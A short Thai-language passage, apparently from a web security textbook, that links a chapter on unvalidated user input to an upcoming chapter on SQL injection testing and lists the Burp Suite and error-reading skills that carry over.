เมื่ออ่านคำขอได้ แก้ไขได้ และเห็นว่าข้อมูลจากผู้ใช้ไหลไปถึงไหน คำถามถัดไปคือข้อมูลนั้นไปสิ้นสุดที่ใด ในระบบส่วนใหญ่ ปลายทางของข้อมูลคือฐานข้อมูล และนั่นคือจุดที่บทที่ 7 เริ่มต้น

บทนี้อธิบายว่าช่องโหว่เกิดเมื่อแอปพลิเคชันนำข้อมูลจากผู้ใช้ไปใช้โดยไม่ตรวจสอบ บทถัดไปจะแสดงว่าหลักการเดียวกันนี้ให้ผลที่หนักกว่าเมื่อข้อมูลนั้นถูกนำไปต่อเป็นคำสั่งฐานข้อมูล เพราะผลลัพธ์ไม่ใช่เพียงการอ่านไฟล์หนึ่งไฟล์ แต่คือการอ่าน เขียน และลบข้อมูลทั้งหมดที่บัญชีฐานข้อมูลนั้นเข้าถึงได้

เทคนิคที่บทนี้สร้างไว้จะถูกใช้ซ้ำในบทถัดไปเกือบทั้งหมด การเห็นคำตอบผิดพลาดที่บอกโครงสร้างคำสั่ง การใช้ Burp Suite ส่งคำขอเดิมซ้ำพร้อมแก้ค่า การแยกความแตกต่างระหว่างคำตอบปกติกับคำตอบที่ผิดปกติ และการบันทึกผลอย่างเป็นระบบ ล้วนเป็นพื้นฐานของการทดสอบการฉีดคำสั่งฐานข้อมูล

สิ่งที่เพิ่มเข้ามาในบทถัดไปคือภาษาของฐานข้อมูล ซึ่งมีไวยากรณ์และตรรกะของตัวเอง ผู้เรียนจะพบว่าความเข้าใจในภาษา SQL กลายเป็นเครื่องมือที่สำคัญพอๆ กับเครื่องมือทดสอบ และการอ่านข้อความผิดพลาดอย่างละเอียดจะให้ข้อมูลมากกว่าการใช้เครื่องมืออัตโนมัติในหลายกรณี
